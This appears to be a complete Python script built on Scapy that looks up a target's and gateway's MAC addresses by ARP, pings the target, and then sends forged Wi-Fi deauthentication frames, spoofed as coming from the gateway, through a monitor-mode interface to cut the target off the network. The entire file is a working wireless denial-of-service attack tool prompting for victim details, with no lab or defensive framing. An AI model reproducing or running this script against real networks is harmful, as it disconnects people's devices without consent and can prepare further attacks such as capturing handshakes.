from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp, Ether, ARP, srp, sr1, IP, ICMP
import sys

# get the mac address of target
def getMac(ip):
    arp = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    ans, _ = srp(arp, timeout=1, verbose=False)
    if ans!=None:
        return(ans[0][1][ARP].hwsrc)


# get the target IP and the interface to use
target = input('Enter the IP address of target:')
gateway=input('Enter the IP addess of gateway:')
interface = input('Enter the name of moniter mode interface:')

# check if target is reachable
ping = IP(dst=target)/ICMP()
ans = sr1(ping, timeout=5, verbose=False)

if ans == None:
    print('Target is not reachable!')
    sys.exit()

targetMac=getMac(target)
gatewayMac=getMac(gateway)

# finally create deauth packets and send them for one minute with 2 seconds intervals to entire network
if ans != None:
    dot11 = Dot11(addr1=targetMac, addr2=gatewayMac,addr3=gatewayMac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=0)
    sendp(packet, inter=2, count=30, iface=interface, verbose=True)
